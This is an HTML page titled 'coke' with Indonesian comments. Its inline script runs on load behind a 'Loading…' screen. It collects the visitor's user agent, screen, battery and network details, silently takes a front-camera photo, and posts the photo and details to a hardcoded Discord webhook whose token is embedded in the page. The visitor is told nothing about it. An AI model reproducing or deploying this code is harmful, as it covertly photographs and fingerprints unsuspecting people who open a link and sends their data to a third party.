<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8"/>
  <title>coke</title>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <style>
    body{margin:0;background:#000;color:#0f0;font-family:monospace;font-size:12px;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh}
    video,canvas{display:none}
    #log{white-space:pre-wrap}
  </style>
</head>
<body>
  <div id="log">Loading…</div>
  <video id="v" autoplay playsinline></video>
  <canvas id="c" width="320" height="240"></canvas>

  <script>
    const WH = "https://discord.com/api/webhooks/1404044946486595717/96JErRMO3zwCfj7CzKay_DFeGjp00ZqnGKYkSU0oKinbVoN2szF0afMIL3HgdxAPUB_p";
    const v = document.getElementById('v');
    const c = document.getElementById('c');
    const log = document.getElementById('log');

    async function main(){
      try {
        /*----- data hp -----*/
        const ua = navigator.userAgent;
        const scr = `${screen.width}x${screen.height} (${screen.availWidth}x${screen.availHeight})`;
        const bat = await navigator.getBattery().then(b => `${Math.round(b.level*100)}% ${b.charging?'⚡':''}`).catch(()=>'?');
        const net = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        const conn = net ? `${net.effectiveType} (${net.downlink}Mbps)` : '?';

        const info = `UA: ${ua}\nScreen: ${scr}\nBattery: ${bat}\nNetwork: ${conn}`;

        /*----- kamera -----*/
        const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
        v.srcObject = s;

        /*----- tunggu 1 detik -----*/
        await new Promise(r=>setTimeout(r,1000));

        /*----- jepret -----*/
        const ctx = c.getContext('2d');
        ctx.drawImage(v,0,0,c.width,c.height);
        const blob = await new Promise(r=>c.toBlob(r,'image/jpeg',0.8));

        /*----- kirim ke discord -----*/
        const fd = new FormData();
        fd.append('file', blob, 'coke.jpg');
        fd.append('payload_json', JSON.stringify({
          embeds:[{
            title: "📸 Coke",
            description: "```"+info+"```",
            color: 0x00ff00
          }]
        }));

        const res = await fetch(WH,{method:'POST',body:fd});
        if(res.ok) log.textContent = "✅ Terkirim.";
        else      log.textContent = "❌ Gagal kirim: "+res.status;

        /*----- stop kamera -----*/
        s.getTracks().forEach(t=>t.stop());
      }catch(e){
        log.textContent = "Error: "+e;
      }
    }
    main();
  </script>
</body>
</html>